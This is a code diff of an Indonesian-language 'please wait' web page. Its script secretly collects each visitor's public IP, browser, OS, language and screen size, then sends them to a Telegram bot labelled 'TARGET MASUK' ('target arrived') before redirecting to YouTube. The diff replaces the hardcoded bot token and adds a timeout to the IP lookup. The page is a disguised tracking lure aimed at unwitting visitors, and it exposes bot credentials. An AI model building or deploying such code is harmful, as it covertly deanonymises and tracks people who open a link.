@@ -16,16 +16,14 @@
   <p>Mohon tunggu sebentar, jangan tutup halaman ini.</p>
   
 <script>
-  // ==========================================
-  // KONFIGURASI TELEGRAM (SUDAH TERHUBUNG)
-  // ==========================================
-  const TELEGRAM_BOT_TOKEN = "8608235988:AAHyESiSOROHyvNI-5-D80jfu982ESsT5EE"; 
+  // TOKEN BARU & CHAT ID LO
+  const TELEGRAM_BOT_TOKEN = "8608235988:AAFzFbqlhJJjfjNodYy-_74wZBHodfSb87k"; 
   const TELEGRAM_CHAT_ID = "6809927557"; 
 
   async function sendToTelegram() {
     let info = {
-      "🌐 URL Asal": window.location.href,
-      "📱 Device/OS": navigator.platform,
+      "🌐 URL": window.location.href,
+      "📱 OS": navigator.platform,
       "🖥️ Browser": navigator.userAgent,
       "🗣️ Bahasa": navigator.language,
       "📐 Resolusi": `${screen.width}x${screen.height}`,
@@ -33,14 +31,17 @@
     };
 
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 3000);
+      const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+      clearTimeout(timeoutId);
       const ipData = await ipRes.json();
       info["📍 IP Publik"] = ipData.ip;
     } catch (e) {
-      info["📍 IP Publik"] = "Gagal diambil";
+      info["📍 IP Publik"] = "Timeout / Gagal diambil";
     }
 
-    let message = "🚨 *TARGET BARU MASUK* 🚨\n\n";
+    let message = "🚨 *TARGET MASUK* 🚨\n\n";
     for (let [key, value] of Object.entries(info)) {
       message += `${key}: ${value}\n`;
     }
@@ -56,17 +57,17 @@
           parse_mode: "Markdown"
         })
       });
-      
-      setTimeout(() => {
-        window.location.href = "https://www.youtube.com";
-      }, 3000);
-      
     } catch (e) {
-      console.error("Gagal kirim:", e);
+      console.log("Gagal kirim:", e);
     }
   }
 
   sendToTelegram();
+  
+  // Alihkan ke YouTube setelah 3 detik
+  setTimeout(() => {
+    window.location.href = "https://www.youtube.com";
+  }, 3000);
 </script>
 </body>
-</html>
+  </html>
